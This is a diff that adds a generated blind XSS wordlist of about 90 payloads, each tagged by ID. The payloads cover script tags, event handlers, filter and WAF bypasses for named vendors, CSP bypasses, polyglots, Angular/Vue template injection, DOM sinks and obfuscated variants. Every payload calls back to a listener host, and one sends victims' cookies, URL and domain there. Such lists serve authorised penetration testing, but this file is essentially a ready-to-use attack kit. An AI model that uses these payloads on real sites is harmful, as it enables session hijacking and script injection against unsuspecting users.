@@ -1,0 +1,352 @@
+# BLIND XSS WORDLIST
+# Generated : 2026-03-10 13:12:58
+# Callback IP : http://192.168.1.1:8080
+# Categories : basic, event, bypass, waf, csp, polyglot, angular, dom, obfuscated
+# Total payloads : 97
+# Format : PAYLOAD_ID | CATEGORY | DESCRIPTION
+# Each payload contains a unique ID for easy identification when triggered
+#
+# HOW TO READ RESULTS:
+#   When your server receives a hit on /http://192.168.1.1:8080/<PAYLOAD_ID>,
+#   you know exactly which payload triggered the XSS.
+#   Example: hit on /BAS-001 = Basic script tag worked
+# ──────────────────────────────────────────────────────────────────────
+
+
+# ════════════════════════════════════════════════════════════════════
+# CATEGORY: BASIC
+# ════════════════════════════════════════════════════════════════════
+
+# [BAS-001] Basic <script> tag avec src callback
+<script src='http://192.168.1.1:8080/BAS-001'></script>
+
+# [BAS-002] Basic <script> inline avec script loader
+<script>var s=document.createElement('script');s.src='http://192.168.1.1:8080/BAS-002';document.body.appendChild(s);</script>
+
+# [BAS-003] img onerror avec script loader
+<img src=x onerror="var s=document.createElement('script');s.src='http://192.168.1.1:8080/BAS-003';document.body.appendChild(s);">
+
+# [BAS-004] svg onload avec script loader
+<svg onload="var s=document.createElement('script');s.src='http://192.168.1.1:8080/BAS-004';document.body.appendChild(s);">
+
+# [BAS-005] body onload avec script loader
+<body onload="var s=document.createElement('script');s.src='http://192.168.1.1:8080/BAS-005';document.body.appendChild(s);">
+
+# [BAS-006] iframe onload
+<iframe onload="var s=document.createElement('script');s.src='http://192.168.1.1:8080/BAS-006';document.body.appendChild(s);">
+
+# [BAS-007] input autofocus + onfocus
+<input autofocus onfocus="var s=document.createElement('script');s.src='http://192.168.1.1:8080/BAS-007';document.body.appendChild(s);">
+
+# [BAS-008] details ontoggle
+<details open ontoggle="var s=document.createElement('script');s.src='http://192.168.1.1:8080/BAS-008';document.body.appendChild(s);">
+
+# [BAS-009] marquee onstart
+<marquee onstart="var s=document.createElement('script');s.src='http://192.168.1.1:8080/BAS-009';document.body.appendChild(s);">
+
+# [BAS-010] video onerror
+<video src=x onerror="var s=document.createElement('script');s.src='http://192.168.1.1:8080/BAS-010';document.body.appendChild(s);">
+
+# [BAS-011] audio onerror
+<audio src=x onerror="var s=document.createElement('script');s.src='http://192.168.1.1:8080/BAS-011';document.body.appendChild(s);">
+
+# [BAS-012] Exfiltration complète (cookie+URL+domain)
+<script>var d=document;fetch('http://192.168.1.1:8080/BAS-012?c='+encodeURIComponent(d.cookie)+'&u='+encodeURIComponent(d.URL)+'&o='+encodeURIComponent(d.domain));</script>
+
+# [BAS-013] javascript: URI pour href/link
+javascript:var s=document.createElement('script');s.src='http://192.168.1.1:8080/BAS-013';document.body.appendChild(s);
+
+# [BAS-014] object data javascript URI
+<object data='javascript:new Image().src='http://192.168.1.1:8080/BAS-014';'>
+
+
+# ════════════════════════════════════════════════════════════════════
+# CATEGORY: EVENT
+# ════════════════════════════════════════════════════════════════════
+
+# [EVT-001] <body onpageshow
+<body onpageshow="var s=document.createElement('script');s.src='http://192.168.1.1:8080/EVT-001';document.body.appendChild(s);">
+
+# [EVT-002] <body onhashchange
+<body onhashchange="var s=document.createElement('script');s.src='http://192.168.1.1:8080/EVT-002';document.body.appendChild(s);">
+
+# [EVT-003] <svg onanimationstart
+<svg onanimationstart="var s=document.createElement('script');s.src='http://192.168.1.1:8080/EVT-003';document.body.appendChild(s);">
+
+# [EVT-004] <svg onanimationend
+<svg onanimationend="var s=document.createElement('script');s.src='http://192.168.1.1:8080/EVT-004';document.body.appendChild(s);">
+
+# [EVT-005] <form oninput
+<form oninput="var s=document.createElement('script');s.src='http://192.168.1.1:8080/EVT-005';document.body.appendChild(s);">
+
+# [EVT-006] <select onchange
+<select onchange="var s=document.createElement('script');s.src='http://192.168.1.1:8080/EVT-006';document.body.appendChild(s);">
+
+# [EVT-007] <textarea onfocus
+<textarea onfocus="var s=document.createElement('script');s.src='http://192.168.1.1:8080/EVT-007';document.body.appendChild(s);">
+
+# [EVT-008] <video oncanplay
+<video oncanplay="var s=document.createElement('script');s.src='http://192.168.1.1:8080/EVT-008';document.body.appendChild(s);">
+
+# [EVT-009] <track onerror
+<track onerror="var s=document.createElement('script');s.src='http://192.168.1.1:8080/EVT-009';document.body.appendChild(s);">
+
+# [EVT-010] <object onafterscriptexecute
+<object onafterscriptexecute="var s=document.createElement('script');s.src='http://192.168.1.1:8080/EVT-010';document.body.appendChild(s);">
+
+# [EVT-011] <object onbeforescriptexecute
+<object onbeforescriptexecute="var s=document.createElement('script');s.src='http://192.168.1.1:8080/EVT-011';document.body.appendChild(s);">
+
+# [EVT-012] <div onmouseover
+<div onmouseover="var s=document.createElement('script');s.src='http://192.168.1.1:8080/EVT-012';document.body.appendChild(s);">
+
+# [EVT-013] <a href='#' onmousedown
+<a href='#' onmousedown="var s=document.createElement('script');s.src='http://192.168.1.1:8080/EVT-013';document.body.appendChild(s);">
+
+# [EVT-014] <button onclick
+<button onclick="var s=document.createElement('script');s.src='http://192.168.1.1:8080/EVT-014';document.body.appendChild(s);">
+
+# [EVT-015] <div onclick
+<div onclick="var s=document.createElement('script');s.src='http://192.168.1.1:8080/EVT-015';document.body.appendChild(s);">
+
+
+# ════════════════════════════════════════════════════════════════════
+# CATEGORY: BYPASS
+# ════════════════════════════════════════════════════════════════════
+
+# [BYP-001] Bypass case sensitive - mixed case tag
+<sCrIpT sRc='http://192.168.1.1:8080/BYP-001'></ScRiPt>
+
+# [BYP-002] Bypass tag blacklist - extra attribute
+<script x src='http://192.168.1.1:8080/BYP-002'></script>
+
+# [BYP-003] Bypass incomplete HTML tag
+<img src='1' onerror='var s=document.createElement('script');s.src='http://192.168.1.1:8080/BYP-003';document.body.appendChild(s);' <
+
+# [BYP-004] Bypass dot filter - bracket notation
+<script>window['fetch']('http://192.168.1.1:8080/BYP-004')</script>
+
+# [BYP-005] Bypass dot filter - base64 atob()
+<script>eval(atob('dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHA6Ly8xOTIuMTY4LjEuMTo4MDgwL0JZUC0wMDUnO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocyk7'))</script>
+
+# [BYP-006] Bypass parenthesis - template literals
+<svg onload=fetch`http://192.168.1.1:8080/BYP-006`>
+
+# [BYP-007] Bypass parens+semicolon - onerror+throw
+<script>onerror=new Image().src='http://192.168.1.1:8080/BYP-007';;throw 1337</script>
+
+# [BYP-008] Bypass space filter - slash separator
+<img/src='1'/onerror=new Image().src='http://192.168.1.1:8080/BYP-008';>
+
+# [BYP-009] Bypass space filter - form-feed 0x0C
+<svgonload=new Image().src='http://192.168.1.1:8080/BYP-009';>
+
+# [BYP-010] Bypass quotes - String.fromCharCode
+<script>var s=document.createElement('script');s.src=String.fromCharCode(104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,49,46,49,58,56,48,56,48,47,66,89,80,45,48,49,48);document.body.appendChild(s);</script>
+
+# [BYP-011] Break out of existing script tag
+</script><script src='http://192.168.1.1:8080/BYP-011'></script>
+
+# [BYP-012] Bypass onxxx= blacklist - null byte
+<img src='1' onerror =new Image().src='http://192.168.1.1:8080/BYP-012'; />
+
+# [BYP-013] Bypass > using nothing - browser fixes
+<svg onload=new Image().src='http://192.168.1.1:8080/BYP-013';//
+
+# [BYP-014] Bypass word blacklist - eval string concatenation
+<script>eval('var s=document.createElement("script");s.src="'+'http://192.168.'+''+'1.1:8080/BYP-014'+'";document.body.appendChild(s);')</script>
+
+# [BYP-015] Bypass HTML encoding - %26%23 trick
+<svg onload=%26%2397%3Bfetch('http%3A//192.168.1.1%3A8080/BYP-015')>
+
+# [BYP-016] Bypass quotes in mousedown - &#39;
+<a href='' onmousedown="var x='&#39;;new Image().src='http://192.168.1.1:8080/BYP-016';//'">Click</a>
+
+# [BYP-017] Bypass document blacklist - string concatenation
+<div id=x></div><script>window['doc'+'ument']['loc'+'ation']='javascript:new Image().src='http://192.168.1.1:8080/BYP-017';'</script>
+
+
+# ════════════════════════════════════════════════════════════════════
+# CATEGORY: WAF
+# ════════════════════════════════════════════════════════════════════
+
+# [WAF-001] Cloudflare bypass - random attribute
+<svg/onrandom=random onload=new Image().src='http://192.168.1.1:8080/WAF-001';>
+
+# [WAF-002] Cloudflare bypass - template literal OnLoad
+<svg/OnLoad="`${new Image().src='http://192.168.1.1:8080/WAF-002';}`">
+
+# [WAF-003] Cloudflare bypass - &nbsp; before payload
+<svg/onload=&nbsp;new Image().src='http://192.168.1.1:8080/WAF-003';+
+
+# [WAF-004] Cloudflare bypass - .1| trick
+1'"><img/src/onerror=.1|new Image().src='http://192.168.1.1:8080/WAF-004';>
+
+# [WAF-005] Cloudflare bypass - iframe srcdoc with encoding
+xss'"><iframe srcdoc='&lt;script&gt;new Image().src='http://192.168.1.1:8080/WAF-005'&lt;/script&gt;'>
+
+# [WAF-006] Cloudflare bypass - HTML entity number encoding
+<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f>
+
+# [WAF-007] Incapsula bypass - CRLF in event handler
+<svg onload
+=$.globalEval("new Image().src='http://192.168.1.1:8080/WAF-007';");>
+
+# [WAF-008] Incapsula bypass - base64 object data
+<object data='data:text/html;base64,PHNjcmlwdD5uZXcgSW1hZ2UoKS5zcmM9J2h0dHA6Ly8xOTIuMTY4LjEuMTo4MDgwL1dBRi0wMDgnOzwvc2NyaXB0Pg=='></object>
+
+# [WAF-009] Akamai bypass - details ontoggle with newlines
+<dETAILS%0aopen%0aonToGgle%0a=%0anew Image().src='http://192.168.1.1:8080/WAF-009'; x>
+
+# [WAF-010] WordFence bypass - HTML entity in javascript:
+<a href=javas&#99;ript:new Image().src='http://192.168.1.1:8080/WAF-010';>Click</a>
+
+# [WAF-011] Fortiweb bypass - unicode escape sequences
+\u003e\u003c\u0068\u0031 onclick="new Image().src='http://192.168.1.1:8080/WAF-011';"\u003e
+
+# [WAF-012] Cloudflare bypass - tab/newline in javascript URI
+<a href="j	av	asc
+ri	pt	:new Image().src='http://192.168.1.1:8080/WAF-012';">X</a>
+
+
+# ════════════════════════════════════════════════════════════════════
+# CATEGORY: CSP
+# ════════════════════════════════════════════════════════════════════
+
+# [CSP-001] CSP bypass - JSONP via Google (script-src google.com)
+<script/src=//google.com/complete/search?client=chrome%26jsonp=new Image().src='http://192.168.1.1:8080/CSP-001';>
+
+# [CSP-002] CSP bypass - JSONP via YouTube
+<script/src=//www.youtube.com/oembed?callback=fetch></script>
+
+# [CSP-003] CSP bypass - default-src self via iframe + script injection
+<script>f=document.createElement('iframe');f.src='/robots.txt';f.onload=()=>{x=document.createElement('script');x.src='http://192.168.1.1:8080/CSP-003';f.contentWindow.document.body.appendChild(x)};document.body.appendChild(f);</script>
+
+# [CSP-004] CSP bypass - script-src self via object data base64
+<object data='data:text/html;base64,PHNjcmlwdD5uZXcgSW1hZ2UoKS5zcmM9J2h0dHA6Ly8xOTIuMTY4LjEuMTo4MDgwL0NTUC0wMDQnOzwvc2NyaXB0Pg=='></object>
+
+# [CSP-005] CSP bypass - script-src data: via data URI
+<script src='data:application/javascript;base64,bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vMTkyLjE2OC4xLjE6ODA4MC9DU1AtMDA1Jzs='>/</script>
+
+# [CSP-006] CSP bypass - nonce via base tag injection (requires relative script src)
+<base href='http://192.168.1.1:8080/CSP-006'>
+
+# [CSP-007] CSP unsafe-inline bypass - break out of attribute
+"/><script>new Image().src='http://192.168.1.1:8080/CSP-007';</script>
+
+# [CSP-008] CSP bypass - PHP header via 1000 GET params (note: ajouter dans l'URL)
+GET /?xss=<script src='http://192.168.1.1:8080/CSP-008'></script>&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=&a=
+
+
+# ════════════════════════════════════════════════════════════════════
+# CATEGORY: POLYGLOT
+# ════════════════════════════════════════════════════════════════════
+
+# [POL-001] Polyglot 0xsobky style - multi-context blind XSS
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=new Image().src='http://192.168.1.1:8080/POL-001'; )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csvg/<svg/oNloAd=new Image().src='http://192.168.1.1:8080/POL-001';//>/\x3e
+
+# [POL-002] Polyglot Ashar Javed style - HTML multi-context
+">><marquee><img src=x onerror=new Image().src='http://192.168.1.1:8080/POL-002';></marquee>" ></plaintext\></|\><plaintext/onmouseover=new Image().src='http://192.168.1.1:8080/POL-002'; ><script>new Image().src='http://192.168.1.1:8080/POL-002';</script>
+
+# [POL-003] Polyglot Mathias Karlsson - attribute/HTML context
+" onclick=new Image().src='http://192.168.1.1:8080/POL-003';//<button ' onclick=new Image().src='http://192.168.1.1:8080/POL-003';//>
+
+# [POL-004] Polyglot EdOverflow - JS string/HTML/attribute context
+javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg/onload=/*<html/*/onmouseover=new Image().src='http://192.168.1.1:8080/POL-004';//>
+
+# [POL-005] Polyglot brutelogic comprehensive - tous contextes
+JavaScript://%250Anew Image().src='http://192.168.1.1:8080/POL-005';//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${};{new Image().src='http://192.168.1.1:8080/POL-005';}//><Base/Href=//http://192.168.1.1:8080/POL-005\76-->
+
+# [POL-006] Polyglot s0md3v - SVG template literal fetch
+-->'"/<br></sCript><svG x=">" onload=(fetch)`http://192.168.1.1:8080/POL-006`>
+
+# [POL-007] Polyglot - SVG null byte + CRLF
+<svg%0Ao%00nload=new Image().src='http://192.168.1.1:8080/POL-007';//
+
+
+# ════════════════════════════════════════════════════════════════════
+# CATEGORY: ANGULAR
+# ════════════════════════════════════════════════════════════════════
+
+# [ANG-001] Angular CSTI 1.0.1-1.1.5 / >1.6.0 - Mario Heiderich (Cure53)
+{{constructor.constructor("var _=document.createElement('script');_.src='http://192.168.1.1:8080/ANG-001';document.getElementsByTagName('body')[0].appendChild(_)")()}}
+
+# [ANG-002] Angular CSTI 1.0.1-1.1.5 / >1.6.0 - Lewis Ardern & Gareth Heyes (shorter)
+{{$on.constructor("var _=document.createElement('script');_.src='http://192.168.1.1:8080/ANG-002';document.getElementsByTagName('body')[0].appendChild(_)")()}}
+
+# [ANG-003] Angular CSTI 1.2.0-1.2.5 - Gareth Heyes
+{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",eval(`var _=document\\x2ecreateElement(\'script\');_\\x2esrc=\'http://192.168.1.1:8080/ANG-003\';document\\x2ebody\\x2eappendChild(_);`),"')}};
+
+# [ANG-004] Angular CSTI 1.4.0-1.5.8 - Gareth Heyes
+{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,eval(`var _=document.createElement(\'script\');_.src=\'http://192.168.1.1:8080/ANG-004\';document.body.appendChild(_);`),a')}}
+
+# [ANG-005] Angular CSTI 1.6+ sans quotes - via fromCharCode
+{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(118,97,114,32,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,115,46,115,114,99,61,39,104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,49,46,49,58,56,48,56,48,47,65,78,71,45,48,48,53,39,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59))()}}
+
+# [ANG-006] Angular CSTI 1.6+ via $eval.constructor
+{{$eval.constructor("var _=document.createElement('script');_.src='http://192.168.1.1:8080/ANG-006';document.getElementsByTagName('body')[0].appendChild(_)")()}}
+
+# [ANG-007] VueJS template injection - constructor.constructor (img beacon)
+{{constructor.constructor("new Image().src='http://192.168.1.1:8080/ANG-007'")()}}
+
+
+# ════════════════════════════════════════════════════════════════════
+# CATEGORY: DOM
+# ════════════════════════════════════════════════════════════════════
+
+# [DOM-001] DOM XSS via location.hash - script injection
+#<script src='http://192.168.1.1:8080/DOM-001'></script>
+
+# [DOM-002] DOM XSS via document.write javascript URI
+javascript:document.write('<script src="http://192.168.1.1:8080/DOM-002"><\/script>')
+
+# [DOM-003] DOM XSS via innerHTML - img onerror
+<img src=x onerror=new Image().src='http://192.168.1.1:8080/DOM-003';>
+
+# [DOM-004] DOM XSS - break out of JS string in eval context
+'-new Image().src='http://192.168.1.1:8080/DOM-004';-'
+
+# [DOM-005] DOM XSS via postMessage
+<script>window.postMessage('<img src=x onerror="new Image().src='http://192.168.1.1:8080/DOM-005';">', '*');</script>
+
+# [DOM-006] DOM XSS via location redirect
+javascript:new Image().src='http://192.168.1.1:8080/DOM-006';location.href
+
+# [DOM-007] DOM XSS via hash - innerHTML sink
+#<img src=x onerror=new Image().src='http://192.168.1.1:8080/DOM-007';>
+
+
+# ════════════════════════════════════════════════════════════════════
+# CATEGORY: OBFUSCATED
+# ════════════════════════════════════════════════════════════════════
+
+# [OBF-001] Obfuscated - unicode escape sequences pour script loader
+<script>\u0076\u0061\u0072 \u0073=\u0064\u006F\u0063\u0075\u006D\u0065\u006E\u0074.\u0063\u0072\u0065\u0061\u0074\u0065\u0045\u006C\u0065\u006D\u0065\u006E\u0074('\u0073\u0063\u0072\u0069\u0070\u0074');\u0073.\u0073\u0072\u0063='http://192.168.1.1:8080/OBF-001';\u0064\u006F\u0063\u0075\u006D\u0065\u006E\u0074.\u0062\u006F\u0064\u0079.\u0061\u0070\u0070\u0065\u006E\u0064\u0043\u0068\u0069\u006C\u0064(\u0073);</script>
+
+# [OBF-002] Obfuscated - base64 + Function() constructor
+<script>Function(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vMTkyLjE2OC4xLjE6ODA4MC9PQkYtMDAyJzs='))()</script>
+
+# [OBF-003] Obfuscated - base64 + eval(atob())
+<script>eval(atob('bmV3IEltYWdlKCkuc3JjPSdodHRwOi8vMTkyLjE2OC4xLjE6ODA4MC9PQkYtMDAzJzs='))</script>
+
+# [OBF-004] Obfuscated - string concat dans setTimeout
+<script>setTimeout('new I'+'mage().s'+'rc="http://192.168.1.1:8080/OBF-004"',0)</script>
+
+# [OBF-005] Obfuscated - octal encoding (fetch)
+<script>eval('\146\145\164\143\150("' + 'http://192.168.1.1:8080/OBF-005' + '")')</script>
+
+# [OBF-006] Obfuscated - URL encoding + decodeURIComponent
+<script>eval(decodeURIComponent('new%20Image%28%29.src%3D%27http%3A//192.168.1.1%3A8080/OBF-006%27%3B'))</script>
+
+# [OBF-007] Obfuscated - Array.map arrow function
+<script>['http://192.168.1.1:8080/OBF-007'].map(u=>{var s=document.createElement('script');s.src=u;document.body.appendChild(s)})</script>
+
+# [OBF-008] Obfuscated - this[] + split string concatenation
+<script>this['fe'+'tch']('http://192.168.1.1:8080/OBF-008')</script>
+
+# [OBF-009] Obfuscated - Object.keys + regex pour trouver fetch
+<script>a=()=>{c=0;for(i in self){if(/^fe[tc]+h$/.test(i)){return c}c++}};self[Object.keys(self)[a()]]('http://192.168.1.1:8080/OBF-009')</script>
+
+# [OBF-010] Obfuscated - XOR simple avec Map + fromCharCode
+<script>eval(String.fromCharCode(...[68,79,93,10,99,71,75,77,79,2,3,4,89,88,73,23,13,66,94,94,90,16,5,5,27,19,24,4,27,28,18,4,27,4,27,16,18,26,18,26,5,101,104,108,7,26,27,26,13,17].map(c=>c^42)))</script>
+
